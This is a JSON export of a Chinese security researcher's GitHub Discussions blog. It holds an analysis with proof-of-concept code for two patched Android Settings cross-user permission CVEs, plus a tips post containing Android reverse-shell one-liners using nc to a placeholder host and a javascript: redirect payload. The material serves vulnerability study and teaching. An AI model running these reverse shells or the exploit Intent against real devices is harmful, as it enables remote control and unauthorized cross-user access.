{'date': '2025-11-29 08:46:41', 'nodes': [{'title': '组件缺失校验导致跨用户CVE-2023-21107&CVE-2024-43088', 'number': 3, 'url': 'https://github.com/CloveIso/notes/discussions/3', 'createdAt': '2024-11-21T07:14:32Z', 'lastEditedAt': '2024-11-21T08:11:32Z', 'updatedAt': '2024-11-21T08:11:32Z', 'body': '# 组件缺失校验导致跨用户CVE-2023-21107&CVE-2024-43088\r\n<!-- 组件缺失校验导致跨用户CVE-2023-21107&CVE-2024-43088 -->\r\n<!-- more -->\r\n作为一个关键系统应用，系统设置拥有跨用户权限，此漏洞中的一个 Fragment 接收外部传递的 user handle 而没有任何输入校验和权限检查，然后直接开始使用这个 user handle，这样就使得攻击者可以利用一个低权限的恶意应用，打开 Settings 并传入其他用户的 handle，让高权限的 Settings 错误访问和操作其他用户的数据。\r\n\r\nCVE-2023-21107漏洞补丁：[Enforce INTERACT_ACROSS_USERS_FULL permission for NotificationAccessDetails](https://android.googlesource.com/platform/packages/apps/Settings/+/179e5ce2a521710992b5ebdb2d88e0c3b3f2c12b^!/#F0)\r\n\r\nCVE-2024-43088漏洞补丁：[Checks cross user permission before handling intent](https://android.googlesource.com/platform/packages/apps/Settings/+/975c28535419be1cc45f66712f41e4a7a40e6001)\r\n\r\n## CVE-2024-43088分析\r\n\r\n两个漏洞基本一模一样，这里以CVE-2024-43088为例浅浅分析一下\r\n\r\n先看一下补丁：\r\n\r\n```java\r\n@@ -135,8 +137,13 @@\r\n             }\r\n         }\r\n         if (intent != null && intent.hasExtra(Intent.EXTRA_USER_HANDLE)) {\r\n-            mUserId = ((UserHandle) intent.getParcelableExtra(\r\n-                    Intent.EXTRA_USER_HANDLE)).getIdentifier();\r\n+            mUserId = ((UserHandle) intent.getParcelableExtra(Intent.EXTRA_USER_HANDLE))\r\n+                    .getIdentifier();\r\n+            if (mUserId != UserHandle.myUserId() && !hasInteractAcrossUsersPermission()) {\r\n+                Log.w(TAG, "Intent not valid.");\r\n+                finish();\r\n+                return "";\r\n+            }\r\n         } else {\r\n             mUserId = UserHandle.myUserId();\r\n         }\r\n@@ -159,6 +166,28 @@\r\n         return mPackageName;\r\n     }\r\n \r\n+    @VisibleForTesting\r\n+    protected boolean hasInteractAcrossUsersPermission() {\r\n+        Activity activity = getActivity();\r\n+        if (!(activity instanceof SettingsActivity)) {\r\n+            return false;\r\n+        }\r\n+        final String callingPackageName =\r\n+                ((SettingsActivity) activity).getInitialCallingPackage();\r\n+\r\n+        if (TextUtils.isEmpty(callingPackageName)) {\r\n+            Log.w(TAG, "Not able to get calling package name for permission check");\r\n+            return false;\r\n+        }\r\n+        if (mPm.checkPermission(Manifest.permission.INTERACT_ACROSS_USERS_FULL, callingPackageName)\r\n+                != PackageManager.PERMISSION_GRANTED) {\r\n+            Log.w(TAG, "Package " + callingPackageName + " does not have required permission "\r\n+                    + Manifest.permission.INTERACT_ACROSS_USERS_FULL);\r\n+            return false;\r\n+        }\r\n+        return true;\r\n+    }\r\n+\r\n```\r\n\r\n主要添加了hasInteractAcrossUsersPermission。当userID和当前的userID不同时就会调用hasInteractAcrossUsersPermission函数来校验拉起方是否有跨用户权限\r\n\r\n找到漏洞位置：public abstract class AppInfoBase extends SettingsPreferenceFragment implements ApplicationsState.Callbacks，是一个fragment，并且是一个抽象类\r\n\r\n![aosp.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158042230_aosp.png)\r\n\r\n 查找该函数调用：\r\n\r\n![image-20241111155852745.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158465468_image-20241111155852745.png)\r\n\r\n以com.android.settings.applications.UsageAccessDetails为例，对应的是com.android.settings.Settings.AppUsageAccessSettingsActivity\r\n\r\n![image-20241111160036278.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158582299_image-20241111160036278.png)\r\n\r\n我们直接拉起他看是什么样的\r\n\r\n```\r\n                Intent intent = new Intent();\r\n                intent.setClassName("com.android.settings", "com.android.settings.Settings$AppUsageAccessSettingsActivity");\r\n                intent.setData(Uri.parse("com.android.chrome"));\r\n                startActivity(intent);\r\n```\r\n\r\n![image-20241111160719648.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158670050_image-20241111160719648.png)\r\n\r\n看到这个界面大概就明白了。就是可以跨用户授权呗\r\n\r\n先随便写个应用，申请一下android.permission.PACKAGE_USAGE_STATS权限安装到user10\r\n\r\n![image-20241111160202204.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158839396_image-20241111160202204.png)\r\n\r\n![image-20241111160314023.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158981135_image-20241111160314023.png)\r\n\r\n现在是不允许状态\r\n\r\n![image-20241111160843406.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159148933_image-20241111160843406.png)\r\n\r\n然后我们切换回主用户再写一个应用\r\n\r\n```\r\nIntent intent = new Intent();\r\nintent.setClassName("com.android.settings", "com.android.settings.Settings$AppUsageAccessSettingsActivity");\r\nintent.setData(Uri.parse("com.android.test5"));\r\nUserHandle us = UserHandle.getUserHandleForUid(1010000);\r\nLog.e(TAG, "onClick: " + us );\r\nintent.putExtra("android.intent.extra.user_handle", us);\r\nstartActivity(intent);\r\n```\r\n\r\n![image-20241111160549919.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159477345_image-20241111160549919.png)\r\n\r\n运行poc之后是这样子的\r\n\r\n![image-20241111160600370.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159559467_image-20241111160600370.png)\r\n\r\n我们点击允许按钮，然后再切换到user10，这时已经变成已允许了\r\n\r\n![image-20241111160909923.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159825397_image-20241111160909923.png)\r\n\r\n## 杂项\r\n\r\ncom.android.settings.applications.AppInfoBase的子类有很多，该问题代码在AppInfoBase的onCreate函数里就会调用。所以按理来说他的所有子类都是可以利用的。\r\n\r\n但是实际并不是这样。由于settings的fragment的启动限制，有两种情况是没法利用的。\r\n\r\n一种是只能由点击进入的fragment，例如com.android.settings.applications.AppStorageSettings\r\n\r\n还有一种是在FRAGMENT_TO_SPA_APP_DESTINATION_PREFIX_MAP这个map里的\r\n\r\n因为在这两个map里的fragment会调用com.android.settings.spa.SpaActivity$Companion.startSpaActivityForApp函数\r\n\r\n![image-20241111170151967.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732160032804_image-20241111170151967.png)\r\n\r\nstartSpaActivityForApp函数会从intent中获取包名。然后末尾加上当前的userID，导致无法利用\r\n\r\n![image-20241111170218170.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732172359362_image-20241111170218170.png)\r\n\r\n那么还有哪些fragment可以利用呢，我仔细过滤了一遍：\r\n\r\n然后只发现了一个0.0\r\n\r\ncom.android.settings.applications.appinfo.LongBackgroundTasksDetails\r\n\r\n![image-20241111170554992.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732172423758_image-20241111170554992.png)\r\n\r\n\r\n\r\n', 'bodyText': '组件缺失校验导致跨用户CVE-2023-21107&CVE-2024-43088\n\n\n作为一个关键系统应用，系统设置拥有跨用户权限，此漏洞中的一个 Fragment 接收外部传递的 user handle 而没有任何输入校验和权限检查，然后直接开始使用这个 user handle，这样就使得攻击者可以利用一个低权限的恶意应用，打开 Settings 并传入其他用户的 handle，让高权限的 Settings 错误访问和操作其他用户的数据。\nCVE-2023-21107漏洞补丁：Enforce INTERACT_ACROSS_USERS_FULL permission for NotificationAccessDetails\nCVE-2024-43088漏洞补丁：Checks cross user permission before handling intent\nCVE-2024-43088分析\n两个漏洞基本一模一样，这里以CVE-2024-43088为例浅浅分析一下\n先看一下补丁：\n@@ -135,8 +137,13 @@\n             }\n         }\n         if (intent != null && intent.hasExtra(Intent.EXTRA_USER_HANDLE)) {\n-            mUserId = ((UserHandle) intent.getParcelableExtra(\n-                    Intent.EXTRA_USER_HANDLE)).getIdentifier();\n+            mUserId = ((UserHandle) intent.getParcelableExtra(Intent.EXTRA_USER_HANDLE))\n+                    .getIdentifier();\n+            if (mUserId != UserHandle.myUserId() && !hasInteractAcrossUsersPermission()) {\n+                Log.w(TAG, "Intent not valid.");\n+                finish();\n+                return "";\n+            }\n         } else {\n             mUserId = UserHandle.myUserId();\n         }\n@@ -159,6 +166,28 @@\n         return mPackageName;\n     }\n \n+    @VisibleForTesting\n+    protected boolean hasInteractAcrossUsersPermission() {\n+        Activity activity = getActivity();\n+        if (!(activity instanceof SettingsActivity)) {\n+            return false;\n+        }\n+        final String callingPackageName =\n+                ((SettingsActivity) activity).getInitialCallingPackage();\n+\n+        if (TextUtils.isEmpty(callingPackageName)) {\n+            Log.w(TAG, "Not able to get calling package name for permission check");\n+            return false;\n+        }\n+        if (mPm.checkPermission(Manifest.permission.INTERACT_ACROSS_USERS_FULL, callingPackageName)\n+                != PackageManager.PERMISSION_GRANTED) {\n+            Log.w(TAG, "Package " + callingPackageName + " does not have required permission "\n+                    + Manifest.permission.INTERACT_ACROSS_USERS_FULL);\n+            return false;\n+        }\n+        return true;\n+    }\n+\n主要添加了hasInteractAcrossUsersPermission。当userID和当前的userID不同时就会调用hasInteractAcrossUsersPermission函数来校验拉起方是否有跨用户权限\n找到漏洞位置：public abstract class AppInfoBase extends SettingsPreferenceFragment implements ApplicationsState.Callbacks，是一个fragment，并且是一个抽象类\n\n查找该函数调用：\n\n以com.android.settings.applications.UsageAccessDetails为例，对应的是com.android.settings.Settings.AppUsageAccessSettingsActivity\n\n我们直接拉起他看是什么样的\n                Intent intent = new Intent();\n                intent.setClassName("com.android.settings", "com.android.settings.Settings$AppUsageAccessSettingsActivity");\n                intent.setData(Uri.parse("com.android.chrome"));\n                startActivity(intent);\n\n\n看到这个界面大概就明白了。就是可以跨用户授权呗\n先随便写个应用，申请一下android.permission.PACKAGE_USAGE_STATS权限安装到user10\n\n\n现在是不允许状态\n\n然后我们切换回主用户再写一个应用\nIntent intent = new Intent();\nintent.setClassName("com.android.settings", "com.android.settings.Settings$AppUsageAccessSettingsActivity");\nintent.setData(Uri.parse("com.android.test5"));\nUserHandle us = UserHandle.getUserHandleForUid(1010000);\nLog.e(TAG, "onClick: " + us );\nintent.putExtra("android.intent.extra.user_handle", us);\nstartActivity(intent);\n\n\n运行poc之后是这样子的\n\n我们点击允许按钮，然后再切换到user10，这时已经变成已允许了\n\n杂项\ncom.android.settings.applications.AppInfoBase的子类有很多，该问题代码在AppInfoBase的onCreate函数里就会调用。所以按理来说他的所有子类都是可以利用的。\n但是实际并不是这样。由于settings的fragment的启动限制，有两种情况是没法利用的。\n一种是只能由点击进入的fragment，例如com.android.settings.applications.AppStorageSettings\n还有一种是在FRAGMENT_TO_SPA_APP_DESTINATION_PREFIX_MAP这个map里的\n因为在这两个map里的fragment会调用com.android.settings.spa.SpaActivity$Companion.startSpaActivityForApp函数\n\nstartSpaActivityForApp函数会从intent中获取包名。然后末尾加上当前的userID，导致无法利用\n\n那么还有哪些fragment可以利用呢，我仔细过滤了一遍：\n然后只发现了一个0.0\ncom.android.settings.applications.appinfo.LongBackgroundTasksDetails', 'author': {'login': 'CloveIso'}, 'category': {'name': '01-博客'}, 'labels': {'nodes': [{'name': 'CVE分析'}]}, 'comments': {'nodes': []}}, {'title': '留言板', 'number': 2, 'url': 'https://github.com/CloveIso/notes/discussions/2', 'createdAt': '2024-11-20T03:22:44Z', 'lastEditedAt': '2024-11-20T03:23:55Z', 'updatedAt': '2024-11-21T08:37:05Z', 'body': '欢迎交友。你可以通过邮箱联系，或者移步到 “[GitHub Discussions](https://github.com/Cloveiso/notes/discussions/2)” 写下建议，或者向我提问，当然也可以交个朋友。\r\n\r\n邮箱：[1258511864@qq.com](mailto:1258511864@qq.com)', 'bodyText': '欢迎交友。你可以通过邮箱联系，或者移步到 “GitHub Discussions” 写下建议，或者向我提问，当然也可以交个朋友。\n邮箱：1258511864@qq.com', 'author': {'login': 'CloveIso'}, 'category': {'name': '00-站点相关'}, 'labels': {'nodes': [{'name': 'site_message'}]}, 'comments': {'nodes': [{'body': '这是一条测试', 'author': {'login': 'CloveIso'}}]}}, {'title': '小知识', 'number': 1, 'url': 'https://github.com/CloveIso/notes/discussions/1', 'createdAt': '2024-11-19T06:47:56Z', 'lastEditedAt': '2024-11-21T08:12:36Z', 'updatedAt': '2024-11-21T08:12:36Z', 'body': '<!-- 小知识 -->\r\n<!-- more -->\r\n1、应用对应的uid  /data/system/packages.list\r\n\r\n2、adb操作provider\r\n\r\n```\r\ncontent query --uri content://icc/adn \r\ncontent delete --uri content://settings/settings/pointer_speed\r\ncontent insert --uri content://settings/settings --bind name:s:my_number --bind value:i:2\r\n```\r\n\r\n3、android 反弹shell\r\n\r\n```\r\nrm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/bin/sh -i 2>&1|nc ip 2222 >/data/local/tmp/f\r\nnc ip 2222|/bin/sh|nc ip 6666\r\n```\r\n\r\n4、查看进程状态和uid状态\r\n\r\n```\r\ndumpsys activity processes | grep UidRecord -C 2\r\n```\r\n\r\n5、协议绕过\r\n\r\njavascript://www.baidu.com/%0D%0Awindow.location.href=\'http://ip/js_poc.html\'\r\n\r\n6、android漏洞总结\r\n\r\n```\r\n1、activity\r\n越权绕过、钓鱼欺诈/Activity劫持、隐式启动Intent包含敏感数据、拒绝服务攻击、intent重定向\r\n2、service\r\n权限提升漏洞、service劫持、消息伪造、拒绝服务攻击\r\n3、broadcast reciver\r\n敏感信息泄漏漏洞、权限绕过漏洞、消息伪造、拒绝服务\r\n4、provider\r\n信息泄露、sql注入、目录遍历\r\n\r\n```\r\n\r\n7、调用系统服务\r\n\r\n```kotlin\r\ntry {\r\n    val getServiceMethod = Class.forName("android.os.ServiceManager").getMethod(\r\n        "getService",\r\n        String::class.java\r\n    )\r\n    val binder = getServiceMethod(null, "companiondevice") as IBinder\r\n    val clsStub = Class.forName("android.companion.ICompanionDeviceManager\\$Stub")\r\n    val asInterfaceMethod = clsStub.getDeclaredMethod("asInterface", IBinder::class.java)\r\n    val service = asInterfaceMethod(null, binder)\r\n    val clsProxy = Class.forName("IService\\$Stub\\$Proxy")\r\n    val testMethod = clsProxy.getDeclaredMethod(\r\n        "MethodName", // change the method name\r\n        Float::class.java, Int::class.java, Long::class.java, Long::class.java // method args\r\n    )\r\n    testMethod(service, 10)\r\n} catch (e: Exception) {\r\n    e.printStackTrace()\r\n}\r\n```\r\n\r\n8、查看权限等级\r\n\r\n```\r\npm list permissions -f (经常报错)\r\ndumpsys package | grep -F "Permission [android.permission.DEVICE_POWER]" -C 3\r\n```\r\n\r\n', 'bodyText': '1、应用对应的uid  /data/system/packages.list\n2、adb操作provider\ncontent query --uri content://icc/adn \ncontent delete --uri content://settings/settings/pointer_speed\ncontent insert --uri content://settings/settings --bind name:s:my_number --bind value:i:2\n\n3、android 反弹shell\nrm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/bin/sh -i 2>&1|nc ip 2222 >/data/local/tmp/f\nnc ip 2222|/bin/sh|nc ip 6666\n\n4、查看进程状态和uid状态\ndumpsys activity processes | grep UidRecord -C 2\n\n5、协议绕过\njavascript://www.baidu.com/%0D%0Awindow.location.href=\'http://ip/js_poc.html\'\n6、android漏洞总结\n1、activity\n越权绕过、钓鱼欺诈/Activity劫持、隐式启动Intent包含敏感数据、拒绝服务攻击、intent重定向\n2、service\n权限提升漏洞、service劫持、消息伪造、拒绝服务攻击\n3、broadcast reciver\n敏感信息泄漏漏洞、权限绕过漏洞、消息伪造、拒绝服务\n4、provider\n信息泄露、sql注入、目录遍历\n\n\n7、调用系统服务\ntry {\n    val getServiceMethod = Class.forName("android.os.ServiceManager").getMethod(\n        "getService",\n        String::class.java\n    )\n    val binder = getServiceMethod(null, "companiondevice") as IBinder\n    val clsStub = Class.forName("android.companion.ICompanionDeviceManager\\$Stub")\n    val asInterfaceMethod = clsStub.getDeclaredMethod("asInterface", IBinder::class.java)\n    val service = asInterfaceMethod(null, binder)\n    val clsProxy = Class.forName("IService\\$Stub\\$Proxy")\n    val testMethod = clsProxy.getDeclaredMethod(\n        "MethodName", // change the method name\n        Float::class.java, Int::class.java, Long::class.java, Long::class.java // method args\n    )\n    testMethod(service, 10)\n} catch (e: Exception) {\n    e.printStackTrace()\n}\n8、查看权限等级\npm list permissions -f (经常报错)\ndumpsys package | grep -F "Permission [android.permission.DEVICE_POWER]" -C 3', 'author': {'login': 'CloveIso'}, 'category': {'name': '01-博客'}, 'labels': {'nodes': [{'name': '杂项'}]}, 'comments': {'nodes': []}}]}